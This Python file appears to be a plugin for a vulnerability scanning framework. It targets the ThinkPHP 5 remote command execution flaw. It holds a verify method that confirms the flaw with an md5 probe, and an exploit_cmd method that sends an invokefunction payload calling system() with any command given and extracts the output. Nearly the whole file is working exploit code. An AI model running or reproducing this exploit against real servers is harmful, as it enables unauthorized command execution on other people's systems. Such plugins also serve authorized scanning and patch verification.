import urllib.parse
import re
from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req, get_logger, random_choices
from xing.core import PluginType, SchemeType

class Plugin(BasePlugin):
	def __init__(self):
		super(Plugin, self).__init__()
		self.plugin_type = PluginType.POC
		self.vul_name = "Thinkphp5 远程命令执行漏洞"
		self.app_name = 'Thinkphp'
		self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

	def verify(self, target):
		payload = "?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=20200311a"
		check = b"6a5b23e9427abaac6a90a3067dc0953d"
		paths = ["/", "/public/"]
		self.logger.info("verify {}".format(target))
		for path in paths:
			url = target + path + payload
			conn = http_req(url)
			if check in conn.content:
				self.logger.success("found vul {}".format(url))
				return url

	def exploit_cmd(self, target, cmd):
		random_str = random_choices(4)
		payload = "?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={cmd}"
		tpl = "echo {}&&{}&&echo {}".format(random_str, cmd, random_str)
		paths = ["/", "/public/"]
		self.logger.info("verify {}".format(target))
		reg = r"{}\s([\s\S]+?)\s{}".format(random_str, random_str)
		for path in paths:
			url = target + path + payload.format(cmd=urllib.parse.quote(tpl))
			conn = http_req(url)
			if random_str.encode() in conn.content:
				results = re.findall(reg.encode(), conn.content)
				if results:
					self.logger.success("exploit success, result:")
					print(results[0].decode())
				return True

